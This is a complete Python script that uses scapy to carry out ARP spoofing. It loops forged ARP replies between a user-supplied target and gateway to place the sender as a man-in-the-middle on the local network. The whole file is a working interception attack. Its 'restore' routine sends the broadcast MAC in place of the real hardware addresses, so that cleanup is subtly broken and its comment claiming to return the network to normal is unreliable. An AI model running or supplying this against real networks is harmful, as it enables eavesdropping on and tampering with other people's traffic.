from scapy.all import ARP, send
import os
import sys
import time

def spoof(target_ip, spoof_ip):
    # Construct the ARP packet
    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip)
    send(arp_response, verbose=False)

def restore(target_ip, source_ip):
    # Restore the network to its normal state
    arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=source_ip, hwsrc="ff:ff:ff:ff:ff:ff")
    send(arp_response, count=4, verbose=False)

if __name__ == "__main__":
    target_ip = input("Enter Target IP: ")
    gateway_ip = input("Enter Gateway IP: ")
    
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nRestoring network...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        sys.exit(0)
        
